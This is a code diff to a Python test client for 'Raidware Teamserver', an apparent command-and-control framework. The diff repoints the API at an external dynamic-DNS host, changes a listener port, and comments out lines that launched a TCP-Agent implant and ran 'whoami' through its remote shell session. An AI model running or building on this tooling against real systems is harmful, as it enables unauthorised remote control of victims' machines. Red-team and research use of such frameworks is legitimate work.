@@ -3,7 +3,7 @@ import os, sys
 from threading import Thread
 from time import sleep
 
-base_url = "http://127.0.0.1:5000/v1"
+base_url = "http://haxors.ddns.net:7000/v1"
 team_password = "123"
 
 methods = {
@@ -26,8 +26,8 @@ def _runbg(file):
 
 
 def main():
-    file = r"L:\GIT\Raidware-Agents\windows\RaidwareAgents\Release\TCP-Agent.exe"
-    Thread(target=_runbg, args=(file,), daemon=True).start()
+    # file = r"L:\GIT\Raidware-Agents\windows\RaidwareAgents\Release\TCP-Agent.exe"
+    # Thread(target=_runbg, args=(file,), daemon=True).start()
     
     r = _req(f"{base_url}/version")
     print(f"==> Raidware Teamserver version: {r.text}")
@@ -50,7 +50,7 @@ def main():
                 "type" : "non-staged",
                 "config" : {
                     "host" : "0.0.0.0",
-                    "port" : 9001
+                    "port" : 5252
                 }
             }
         }
@@ -65,21 +65,21 @@ def main():
     else:
         print("==> Listener is already running...")
 
-    print("==> Executing the exe to get a session: ")
-    print("Checking if a session has been created...")
-    print("Sleeping for 5 seconds to wait for session...")
-    sleep(5)
-    r = _req(f"{base_url}/sessions", _method="GET", token=token)
-    print(f"==> Sessions: {r.text}")
-    sid = r.json()['sessions'][0]['UID']
-    print("==> Session ID: ", sid)
-    print("==> Executing command whoami:")
-    r = _req(f"{base_url}/interact", _method="POST", token=token, data = { 'SID' : sid,  'mode' : 'shell', 'payload' : 'whoami' })
-    print("==> Response: ", r.text)
+    # print("==> Executing the exe to get a session: ")
+    # print("Checking if a session has been created...")
+    # print("Sleeping for 5 seconds to wait for session...")
+    # sleep(5)
+    # r = _req(f"{base_url}/sessions", _method="GET", token=token)
+    # print(f"==> Sessions: {r.text}")
+    # sid = r.json()['sessions'][0]['UID']
+    # print("==> Session ID: ", sid)
+    # print("==> Executing command whoami:")
+    # r = _req(f"{base_url}/interact", _method="POST", token=token, data = { 'SID' : sid,  'mode' : 'shell', 'payload' : 'whoami' })
+    # print("==> Response: ", r.text)
 
-    print("==> Press any key to continue...")
-    input()
-    os.system("taskkill /f /im TCP-Agent.exe")
+    # print("==> Press any key to continue...")
+    # input()
+    # os.system("taskkill /f /im TCP-Agent.exe")
 
 if __name__ == "__main__":
     main()
